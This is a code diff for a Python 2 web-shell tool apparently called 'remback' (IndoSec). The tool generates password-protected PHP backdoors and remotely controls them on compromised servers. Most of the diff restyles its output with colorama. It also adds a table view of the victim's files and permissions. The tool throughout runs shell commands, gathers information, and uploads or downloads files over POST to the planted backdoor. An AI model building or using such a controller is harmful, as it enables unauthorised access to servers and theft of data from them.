@@ -1,10 +1,17 @@
 # -*- coding: utf-8 -*-
+
+from colorama import init, Fore, Back, Style
+from prettytable import PrettyTable
 from requests import post
 from time import sleep
 import os
 import re
 import sys
-from sys import platform
+import json
+
+
+init(autoreset=True) #autoreset colorama
+
 reload(sys)
 sys.setdefaultencoding('utf8')
 
@@ -31,12 +38,13 @@ def banner():
     """)
 
 def help():
-    print("""
-[\033[91m+\033[97m] Command :
-└[\033[92m•\033[97m] info\t\t: information gathering
-└[\033[92m•\033[97m] download <file>\t: download file
-└[\033[92m•\033[97m] upload <full/path/of/file>\t: download file
-└[\033[92m•\033[97m] cd <dir>\t\t: change directory""")
+    print( Fore.WHITE + "\n[" + Fore.RED + "+" + Fore.WHITE + "] " + Fore.WHITE + "Command: ")
+
+    print( Fore.WHITE + "└[" + Fore.GREEN + "•" + Fore.WHITE + "] " + Fore.WHITE + "Info\t\t\t: information gathering")
+    print( Fore.WHITE + "└[" + Fore.GREEN + "•" + Fore.WHITE + "] " + Fore.WHITE + "download <file>\t\t: download file ")
+    print( Fore.WHITE + "└[" + Fore.GREEN + "•" + Fore.WHITE + "] " + Fore.WHITE + "upload <path/file>\t\t: download file ")
+    print( Fore.WHITE + "└[" + Fore.GREEN + "•" + Fore.WHITE + "] " + Fore.WHITE + "cd <dir>\t\t\t: change directory ")
+
 
 def fiturcd(cmd, getdir):
     getcmd = re.match(r'cd (.*)', cmd, re.M|re.I)
@@ -81,16 +89,16 @@ def fiturupload(cmd, getdir):
 
     
 def connect():
-    url = raw_input("[\033[93m?\033[97m] Input Backdoor Location\t: ")
-    password = raw_input("[\033[93m?\033[97m] Input Backdoor Password\t: ")
+    url = raw_input(Fore.WHITE + "[" + Fore.YELLOW + "?" + Fore.WHITE + "] " + Fore.WHITE + "Input Backdoor Location: ")
+    password = raw_input(Fore.WHITE + "[" + Fore.YELLOW + "?" + Fore.WHITE + "] " + Fore.WHITE + "Input Backdoor Password: ")
 
     try:
         check = post(url, data={"password":password}).text.replace('\n','')
     except KeyboardInterrupt:
-        print("\n\n[\033[93m!\033[97m] CTRL+C Detected.....")
+        print( Fore.WHITE + "\n\n[" + Fore.YELLOW + "!" + Fore.WHITE + "] " + Fore.WHITE + "CTRL+C Detected.....")
         raise SystemExit
     except:
-        print("[\033[91m-\033[97m] \033[91mError, Check your URL!")
+        print(Fore.WHITE + "[" + Fore.RED + "-" + Fore.WHITE + "] " + Fore.WHITE + "Error, Check your URL!")
         exit(0)
 
     if check == "true":
@@ -98,29 +106,60 @@ def connect():
         getdir = post(url, data={"password":password,"cmd":"pwd"}).text.replace('\n','')
 
         sleep(2)
-        print("[\033[93m!\033[97m] Backdoor Is Live.. Waiting to Connect BackDoor")
+        print(Fore.WHITE + "[" + Fore.YELLOW + "!" + Fore.WHITE + "] " + Fore.WHITE + "Backdoor Is Live.. Waiting to Connect BackDoor..")
         sleep(2)
-        print("[\033[92m✔\033[97m] Backdoor Is Connected..\n")
-
+        print(Fore.WHITE + "[" + Fore.GREEN + "✔" + Fore.WHITE + "] " + Fore.WHITE + "Success, Backdoor Is Connected..\n")
 
         command = "\033[96m┌[remback\033[93m@\033[91mIndoSec]~[\033[92m"+ getdir +"\033[91m]\n\033[96m└\033[93m#\033[97m "
         result = ""
         
         while True:
                 cmd = raw_input(command).rstrip()
-                #upload_file = re.match
 
                 if cmd == "exit":
                     break
                 elif cmd == "clear":
                     cls()
-                    banner()    
+                    banner()  
                 elif cmd == "info":
                     result = post(url, data={"password":password,"dir":getdir,"aksi":"info","cmd":""}).text
                     print(result)
                 elif cmd == "subdo":
                     result = post(url, data={"password":password,"dir":getdir,"aksi":"show_subdo","cmd":""}).text
                     print("\n" + result)
+                elif cmd == "show":
+                    result = PrettyTable()
+
+                    result.field_names = ["Name", "Size", "Last Modified", "Owner/Group", "Permission"]
+
+                    result.align['Name'] = 'l'
+
+                    data = {
+                        "password":password,
+                        "dir":getdir,
+                        "aksi":"show_dirfile",
+                        "cmd":""
+                    }
+
+                    r = post(url, data=data).text
+
+                    output = json.loads(r)
+
+                    for folder in output['folder']:
+                        if folder['status'] == 'green':
+                            result.add_row([folder['nama_folder'] + "/",folder['size'],folder['Last_Modified'],folder['og'], Fore.GREEN + folder['Permission'] + Style.RESET_ALL + Fore.WHITE])
+                        else:
+                            result.add_row([folder['nama_folder'] + "/",folder['size'],folder['Last_Modified'],folder['og'], Fore.RED + folder['Permission'] + Style.RESET_ALL + Fore.WHITE])
+
+                    for files in output['file']:
+                        if folder['status'] == 'green':
+                            result.add_row([files['nama_file'],files['size'],files['Last_Modified'],files['og'], Fore.GREEN + files['Permission'] + Style.RESET_ALL + Fore.WHITE])
+                        else:
+                            result.add_row([files['nama_file'],files['size'],files['Last_Modified'],files['og'], Fore.RED + files['Permission'] + Style.RESET_ALL + Fore.WHITE])
+
+                    
+                    print(result)
+                            
                 elif cmd == "command":
                     help()
 
@@ -130,6 +169,7 @@ def connect():
                     getdir = post(url, data={"password":password,"dir":output,"cmd":"pwd"}).text.replace('\n','')
                     result = post(url, data={"password":password,"dir":getdir,"cmd":cmd}).text
                     command = "\033[96m┌[remback\033[93m@\033[91mIndoSec]~[\033[92m"+ getdir +"\033[91m]\n\033[96m└\033[93m#\033[97m "
+                
                 elif(fiturdownload(cmd, getdir) != False):
                     getname = re.match(r'download (.*)', cmd, re.M|re.I)
                     output = fiturdownload(cmd, getdir)
@@ -144,9 +184,9 @@ def connect():
                     download = post(url, data=data)  
                     if download.text != "False":
                         open(savein + "/" + getname.group(1), 'wb').write(download.content)
-                        result = "[\033[92m✔\033[97m] Success, Download File..\n"              
+                        result = Fore.WHITE + "[" + Fore.GREEN + "✔" + Fore.WHITE + "] " + Fore.WHITE + "Success, Download File.."              
                     else:
-                        result = "[\033[91m-\033[97m] \033[91mError, Download File, Please check name file target!"
+                        result = Fore.WHITE + "[" + Fore.RED + "-" + Fore.WHITE + "] " + Fore.WHITE + "Error, Download file!"
                     
                         
 
@@ -165,43 +205,48 @@ def connect():
                         upload = post(url, data=data, files={"file":files}).text
 
                         if(upload != "error"):
-                            result = "[\033[92m✔\033[97m] Success, Upload File..\n" 
+                            result = Fore.WHITE + "[" + Fore.GREEN + "✔" + Fore.WHITE + "] " + Fore.WHITE + "Success, Upload File.."
                         else:
-                            result = "[\033[91m-\033[97m] \033[91mError, Upload File!"
+                            result = Fore.WHITE + "[" + Fore.RED + "-" + Fore.WHITE + "] " + Fore.WHITE + "Error, Upload file!"
                         
                         
                     except:
-                        print("[\033[91m-\033[97m] \033[91mError, Can't open file!")
+                        print( Fore.WHITE + "[" + Fore.RED + "-" + Fore.WHITE + "] " + Fore.WHITE + "Error, Can't open file!")
                     
                 else:
-                    ###########cmd = ""
                     result = post(url, data={"password":password,"dir":getdir,"cmd":cmd}).text
 
                 print("\033[92m"+result + "\033[0m\n")
     
     else:
-        print("[-] Password is Incorrect")
+        print( Fore.WHITE + "[" + Fore.RED + "-" + Fore.WHITE + "] " + Fore.WHITE + "Password is Incorrect")
         exit(0)
 
 
 def generate():
-    backdoor_name   = raw_input("\n[\033[93m?\033[97m] Backdoor Name : ")
-    password        = raw_input("[\033[93m?\033[97m] Password      : ")
+    backdoor_name   = raw_input(Fore.WHITE + "[" + Fore.YELLOW + "?" + Fore.WHITE + "] " + Fore.WHITE + "Backdoor Name: ")
+    password        = raw_input(Fore.WHITE + "[" + Fore.YELLOW + "?" + Fore.WHITE + "] " + Fore.WHITE + "Password: ")
     opensample      = open('sample/backdoor.txt', 'r')
     replacePassword = opensample.read().replace('12345', password)
     opensample.close()
     openbackdoor    = open(backdoor_name + '.php', 'w')
     openbackdoor.write(replacePassword)
     openbackdoor.close()
-    print("""\n[\033[92m✔] \033[97mGenerating backdoor successfully\n└[\033[91m•\033[97m] Backdoor Name\t: """ + backdoor_name + """\n└[\033[91m•\033[97m] Backdoor Password\t: """ + password +"""""")
 
+    print( Fore.WHITE + "\n[" + Fore.GREEN + "✔" + Fore.WHITE + "] " + Fore.WHITE + "Generating backdoor successfully")
+    print( Fore.WHITE + "└[" + Fore.RED + "•" + Fore.WHITE + "] " + Fore.WHITE + "Backdoor Name\t:" + backdoor_name)
+    print( Fore.WHITE + "└[" + Fore.RED + "•" + Fore.WHITE + "] " + Fore.WHITE + "Backdoor Password\t:" + password)
+    
 try:
     cls()
     banner()
-    if platform == "win32":
-        print("[\033[93m!\033[97m] Sorry, this tool does not work on Windows operating systems")
+    if sys.platform == "win32":
+        print( Fore.WHITE + "[" + Fore.YELLOW + "!" + Fore.WHITE + "] " + Fore.WHITE + "Sorry, this tool does not work on Windows operating systems")
     else:
-        print("""[\033[91m+\033[97m] Options :\n└[\033[92m•\033[97m] \033[91m1. \033[97mGenerate Backdoor\n└[\033[92m•\033[97m] \033[91m2. \033[97mRemote Backdoor\n└[\033[92m•\033[97m] \033[91m3. \033[97mBypass Shell Exec (Coming Soon)""")
+        print( Fore.WHITE + "[" + Fore.RED + "+" + Fore.WHITE + "] Options :")
+        print( Fore.WHITE + "└[" + Fore.GREEN + "•" + Fore.WHITE + "] " + Fore.RED + "1. " + Fore.WHITE + "Generate Backdoor")
+        print( Fore.WHITE + "└[" + Fore.GREEN + "•" + Fore.WHITE + "] " + Fore.RED + "2. " + Fore.WHITE + "Remote Backdoor")
+        print( Fore.WHITE + "└[" + Fore.GREEN + "•" + Fore.WHITE + "] " + Fore.RED + "3. " + Fore.WHITE + "Bypass Shell Exec (Coming Soon)")
         action = raw_input("\n\033[96m┌[remback\033[93m@\033[91mIndoSec]~[\033[92mChoose the options\033[91m]\n\033[96m└\033[93m#\033[97m ")
         if action == "1":
             cls()
@@ -212,10 +257,10 @@ try:
             banner()
             connect()
         elif action == "3":
-            print("[\033[93m!\033[97m] Coming soon")
+             print( Fore.WHITE + "[" + Fore.YELLOW + "!" + Fore.WHITE + "] " + Fore.WHITE + "Coming Soon")
         else:
-            print("[!] Incorrect options")
+            print( Fore.WHITE + "[" + Fore.YELLOW + "!" + Fore.WHITE + "] " + Fore.WHITE + "Incorrect options")
 except KeyboardInterrupt:
-    print("\n\n[\033[93m!\033[97m] CTRL+C Detected.....")
+    print( Fore.WHITE + "\n\n[" + Fore.YELLOW + "!" + Fore.WHITE + "] " + Fore.WHITE + "CTRL+C Detected.....")
     raise SystemExit
 
